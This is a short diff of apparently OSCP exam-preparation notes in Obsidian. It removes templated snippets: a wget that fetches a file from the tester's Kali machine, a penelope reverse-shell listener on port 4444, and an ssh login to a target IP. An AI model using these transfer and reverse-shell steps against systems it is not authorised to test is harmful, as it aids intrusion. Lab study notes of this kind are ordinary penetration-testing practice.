@@ -37,25 +37,3 @@ const command = `http://${discoveredDomain}/`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-wget from local python server
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const command = `wget http://${KaliIP}:8888/[file]`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-Listener
-
-```
-cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
-```
-
-SSH
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
-
-const command = `ssh [user]@${ip}`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
